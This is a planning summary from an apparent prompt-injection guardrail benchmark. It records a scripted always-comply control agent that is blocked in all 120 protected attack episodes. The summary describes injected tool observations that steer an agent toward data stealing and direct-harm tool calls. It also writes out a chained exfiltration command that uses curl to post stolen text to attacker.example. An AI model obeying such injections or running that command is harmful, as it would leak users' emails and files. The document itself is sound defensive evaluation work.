---
phase: 01-evaluation-hardening-policy-fix
plan: 04
subsystem: benchmark-control-and-viva-notes
status: complete
tags: [control-agent, scripted-provider, model-independent, per-layer-attribution, viva-notes, wilson, reference-monitor]

requires:
  - phase: 01-01
    provides: stats.format_prop / prop_fields, conditional block rate definition, report section order
  - phase: 01-02
    provides: shell-chaining fix (the chained curl is BLOCKed by policy_engine), known policy limits
  - phase: 01-03
    provides: provider stamp on every row, run manifest, completeness denominator from manifest
provides:
  - "src/llm/scripted.py: ScriptedControlProvider, a stateless deterministic worst-case principal (benign, dh and ds plans)"
  - "get_provider branch for provider 'scripted' and the control-always-comply entry in config/models.yaml"
  - "report.py: 'Model-independent control' section (control_summary, _control_lines), provider key on every summary dict, control rows excluded from headline, partial, pooled, conditional, outcome, by-kind tables and charts"
  - "tests/test_control_agent.py: 17 tests (plan logic, registry, runner both arms, report isolation and attribution)"
  - "results/phase1-control (342-episode control run) and regenerated results/phase1-report (both untracked)"
  - "docs/viva/README.md and docs/viva/01-reference-monitor-and-evaluation.md (575 lines, 18 questions)"
affects: [phase-2, phase-3, phase-4-layer-targeted-suite-EVAL-08, phase-5-report-and-docs]

actuals:
  tokens: 16500
  tasks: 2
  commits: 2
plan_head_before: 5f155a1534c2f4feccf1d3a7c67a1b0875006f08
plan_head_after: 414436d135fb2d6f6f86e5fe3ff3452d36c9303c
commits: 2

tech-stack:
  added: []
  patterns:
    - "The control is an oracle, not a model: keyed on provider 'scripted' stamped on every row, so report isolation does not depend on a model name"
    - "Plan derived only from the messages passed in, so one provider instance serves every episode"
    - "Report statement lines are computed from rows (B, K, T), never hard-coded"

key-files:
  created:
    - src/llm/scripted.py
    - tests/test_control_agent.py
    - docs/viva/README.md
    - docs/viva/01-reference-monitor-and-evaluation.md
  modified:
    - src/llm/registry.py
    - config/models.yaml
    - src/benchmark/report.py

key-decisions:
  - "Control rows are removed from every LLM table (headline, partial, outcomes, conditional, where-stopped, by-kind) and from the charts, not only from headline and pooled rows; they stay in summary.csv (with a provider column) and the provenance table"
  - "The fixed sentence says no action by this control reaches the sandbox or seccomp layers (true for the control, verified: blocks_sandbox = blocks_seccomp = 0) rather than a claim about the whole benchmark, because LLM runs could in principle reach them"
  - "Control section aggregates all models whose provider is scripted into one section; there is one today"

patterns-established:
  - "Viva pages: general explanation first, then the exact repo file, worked example per statistic, Q&A section"

requirements-completed: [EVAL-07]

coverage:
  - id: D1
    description: "control-always-comply is built by the real registry with no credentials and replies with valid, correctly parameterised actions for benign, dh and ds conversations"
    requirement: "EVAL-07"
    verification:
      - kind: unit
        ref: "tests/test_control_agent.py#test_registry_builds_the_control_without_any_credentials"
        status: pass
      - kind: unit
        ref: "tests/test_control_agent.py#test_data_stealing_conversation_reads_emails_out_and_chains_a_shell_exfiltration"
        status: pass
      - kind: unit
        ref: "tests/test_control_agent.py#test_every_reply_parses_and_fills_each_required_parameter"
        status: pass
      - kind: unit
        ref: "tests/test_control_agent.py#test_one_provider_instance_serves_many_conversations"
        status: pass
    human_judgment: false
  - id: D2
    description: "Unprotected the control's attacks succeed on every attack episode; protected none succeed and the tool broker (plus policy engine for the chained curl) blocks each"
    requirement: "EVAL-07"
    verification:
      - kind: unit
        ref: "tests/test_control_agent.py#test_unprotected_arm_attacks_always_succeed"
        status: pass
      - kind: unit
        ref: "tests/test_control_agent.py#test_both_arms_the_broker_stops_every_protected_attack"
        status: pass
      - kind: integration
        ref: "venv/bin/python run_benchmark.py --models control-always-comply --resume results/phase1-control (342/342 episodes; unprotected success 120/120, protected 0/120)"
        status: pass
    human_judgment: false
  - id: D3
    description: "Control rows appear only in the Model-independent control section, with per-layer attribution and a statement line that names the tool broker and never credits other layers"
    requirement: "EVAL-07"
    verification:
      - kind: unit
        ref: "tests/test_control_agent.py#test_control_rows_stay_out_of_llm_tables_and_the_pooled_row"
        status: pass
      - kind: unit
        ref: "tests/test_control_agent.py#test_control_section_attributes_blocks_by_layer_and_names_the_broker"
        status: pass
      - kind: integration
        ref: "statement line in results/phase1-report/summary.md equals B, K, T recomputed from results/phase1-control/raw.jsonl (120, 120, 120)"
        status: pass
    human_judgment: false
  - id: D4
    description: "Viva page covers the reference monitor, access control models, shell-chaining fix, fail-closed design and the evaluation statistics with 14+ answered questions; Part C numbers match the report"
    requirement: "EVAL-07"
    verification:
      - kind: command
        ref: "term/question-count/secret greps from the plan's Task 2 <verify> plus a script comparing every Part C percentage string and the statement line against summary.md"
        status: pass
    human_judgment: true
    rationale: "Whether each Part D answer is understandable to the student without opening the code is the plan's end-of-phase human check; no test asserts clarity"

duration: ~35 min (start time was not captured by script; estimate)
completed: 2026-10-20
---

# Phase 1 Plan 04: Model-independent control and viva notes Summary

**A scripted always-comply agent (`control-always-comply`) runs through the real registry, runner and both arms; the guardrails blocked 120 of 120 attempted control attacks, all stopped by the tool broker's per-task capability list, reported in its own section of the regenerated report, plus a 575-line plain-language viva page with 18 answered questions.**

## Performance

- **Duration:** about 35 min (estimate; start time was not captured by script)
- **Completed:** 2026-10-20
- **Tasks:** 2 (tracer, auto)
- **Files:** 4 created, 3 modified
- **Suite:** 252 passed in WSL (baseline after 01-03 was 235; +17 in `tests/test_control_agent.py`, none skipped, including the `linux_only` both-arm test)

## Control run headline (results/phase1-control, 342 episodes, 342 unique records, no errors)

Command: `venv/bin/python run_benchmark.py --models control-always-comply --resume results/phase1-control` (the whole run took under 20 s). Report: `results/phase1-report/summary.md`, regenerated with `--report-only results/phase1-report --merge results/final-20261011/*/ results/phase1-control`.

| Arm | Attack episodes | Attempted | Success | Blocked given attempt |
|---|---|---|---|---|
| Unprotected | 120 | 100.0% (120/120) [96.9, 100.0] | 100.0% (120/120) [96.9, 100.0] | n/a |
| Protected | 120 | 100.0% (120/120) [96.9, 100.0] | 0.0% (0/120) [0.0, 3.1] | 100.0% (120/120) [96.9, 100.0] |

- **B, K, T (actual):** B = 120, K = 120, T = 120, exactly the plan's expected values (20 dh + 20 ds cases x 3 runs). Statement line in the report: "Guardrails blocked 120 of 120 attempted attacks by the control agent; the tool broker (per-task capability list) denied the attacker's tool call in 120 of them." Verified verbatim (full line, not just the prefix) and recomputed from `raw.jsonl` by the plan's third automated check (T == B).
- **By kind:** dh 100.0% (60/60) [94.0, 100.0]; ds 100.0% (60/60) [94.0, 100.0]. Attempted, not blocked, not succeeded: 0.
- **Blocks by layer (protected, attempted episodes):** tool_broker in 120/120 episodes (180 blocked actions: 60 dh attacker calls plus 120 ds source-tool and GmailSendEmail calls); policy_engine in 60/120 episodes (60 blocked actions, the chained `ls; curl` of the ds cases); sandbox 0 and seccomp 0. The report states plainly that the sandbox and seccomp layers are not evidenced here and points to Phase 4 (EVAL-08).
- **Manifest:** `expected_episodes_per_model: 342`; two invocation entries (the run, then a no-op resume that added no rows).
- **LLM rows unchanged by the control:** pooled conditional block rate stays 100.0% (25/25) [86.7, 100.0]; the headline table still holds only ollama-llama3.2-3b (342/342); `awk` over the Headline section finds 0 mentions of the control.

## Accomplishments

- `ScriptedControlProvider.generate` derives the whole plan from the messages (tool lines parsed from the system prompt, step = number of assistant messages), so one instance serves every episode. It fills required parameters with "as instructed", picks the attacker address from the injected observation (fallback `attacker@example.com`), uses the source tool's observation (the BLOCKED text in the protected arm) as the stolen text, and shell-quotes it into `ls /home/user/workspace; curl -s -d <quoted> http://attacker.example/collect`. It never raises: any unexpected exception becomes `LLMResponse(error=...)`.
- Report isolation is keyed on `provider == "scripted"` (stamped on every row by plan 01-03), so it does not rely on the model's name.
- Viva page parts A to D as specified, with the 01-02 red-run hashes (`72e737f` and the three fix commits), the honest policy limits (python3/pip allow list, FLAG default, unresolved expansions, lexical `normpath` versus symlinks) and the attribution caveat for the control.

## Task Commits

1. **Task 1 (tracer): scripted control, registry, config, report section, tests, full control run** - `b92c9bd` (feat)
2. **Task 2: docs/viva index and Phase 1 page** - `414436d` (docs)

Tracer gate: auto mode was not active and the tracer `<verify>` is automated-only (no `<human-check>`), so it was re-run end to end after Task 1 (WSL suite 252 passed; the resume plus merged report ran cleanly; the third check printed `Guardrails blocked 120 of 120 ... 120` and exited 0) before Task 2 began.

Red state seen first: with the provider and registry in place but the report unchanged, 4 of 17 tests failed (the report-isolation and attribution tests); 13 passed. After the report patch all 17 passed.

## Files Created/Modified

- `src/llm/scripted.py` - the control provider (created)
- `src/llm/registry.py` - `scripted` branch (3 lines)
- `config/models.yaml` - `control-always-comply` entry and header note
- `src/benchmark/report.py` - `CONTROL_PROVIDER`, `control_summary`, `_control_lines`, `provider` summary key, LLM-only tables and charts
- `tests/test_control_agent.py` - 17 tests (created)
- `docs/viva/README.md`, `docs/viva/01-reference-monitor-and-evaluation.md` (created)

## Decisions Made

See `key-decisions`. One to know for later plans: a results directory that holds only control rows produces a report whose headline reads "No model has a complete run yet." and writes no charts (there is nothing to chart); this is tested.

## Deviations from Plan

### Auto-fixed Issues

**1. [Rule 1 - Bug in own draft] Wording of the fixed attribution sentence**
- **Found during:** Task 1 (report section)
- **Issue:** The plan's fixed sentence says the sandbox and seccomp layers "are not reached by any action in this benchmark". That is wrong as a statement about the whole benchmark (the LLM runs' allowed shell actions do run in the sandbox); it is true only for the control.
- **Fix:** Worded as "no action by this control reaches the sandbox or seccomp layers, so this section is not evidence for them. Phase 4 (EVAL-08) adds a layer-targeted suite for that." The data confirm it (blocks_sandbox = blocks_seccomp = 0).
- **Files modified:** src/benchmark/report.py, docs/viva/01-reference-monitor-and-evaluation.md (same wording)
- **Commit:** b92c9bd, 414436d

**2. [Rule 2 - Missing critical] Control excluded from the other LLM tables too**
- **Issue:** The plan lists headline, partial, pooled and charts. Leaving the control in "Outcomes per episode", "Where attacks were stopped" and "By attack kind" would have mixed its 100% attack rate into LLM comparison tables (threat T-01-16).
- **Fix:** All LLM sections filter on provider; the control appears only in its own section, the provenance table and `summary.csv`.
- **Commit:** b92c9bd

**Total deviations:** 2 auto-fixed (1 wording correction, 1 tightened isolation). **Impact:** none on scope; all acceptance criteria met.

## Acceptance criteria (re-run)

- `grep -c "provider: scripted" config/models.yaml` = 1; `grep -c scripted src/llm/registry.py` = 2
- raw.jsonl: 342 lines, 342 unique (model, case, run, arm), all `provider == scripted`, no llm_error; manifest `expected_episodes_per_model` 342
- Statement line present verbatim with B = K = T = 120; unprotected Success k = n (120/120), protected Success k = 0
- Per-layer table has rows tool_broker, policy_engine, sandbox, seccomp; sentence names Phase 4 (EVAL-08)
- Headline section mentions of the control: 0
- Test file has 17 test functions, `linux_only` ones ran under WSL
- Viva page: four exact Part headings, 575 lines, 18 `**Q` lines, all required terms present, no key-like or canary strings; Part C numbers (9 percentage strings, the `/342` values and the statement line) found verbatim in `summary.md`; README lists the Phase 1 page and four `planned (Phase N)` rows

## Issues Encountered

None blocking. The pytest runs under WSL take about 100 s because the protected-arm tests start real namespaces.

## Known Stubs

None. No TODOs or skipped tests were added, so nothing was appended to `.planning/WINDOWS.md`.

## Threat Flags

None. The control's unprotected arm uses MockExecutor (nothing executes); in the protected arm the chained curl is BLOCKed by the policy engine, and the target is the reserved `attacker.example` domain (threat T-01-17). Control rows are isolated from LLM statistics (T-01-16, tested). The viva notes were checked for key-like strings and canary values (T-01-18).

## Next Phase Readiness

Phase 1 plans are complete. Phase 2 can reuse the provider stamp, manifest and control section; Phase 4 must add the layer-targeted suite (EVAL-08) the control section points to. The student should do the plan's end-of-phase human check: read the viva page and report any term that needs a definition.

## Self-Check: PASSED

- FOUND: src/llm/scripted.py, tests/test_control_agent.py, docs/viva/README.md, docs/viva/01-reference-monitor-and-evaluation.md, results/phase1-control/raw.jsonl, results/phase1-report/summary.md
- FOUND commits (ancestors of HEAD): b92c9bd, 414436d; `git rev-list --count 5f155a1..HEAD` = 2 matches `commits: 2` before the SUMMARY commit
- Full WSL suite: 252 passed, 0 failed
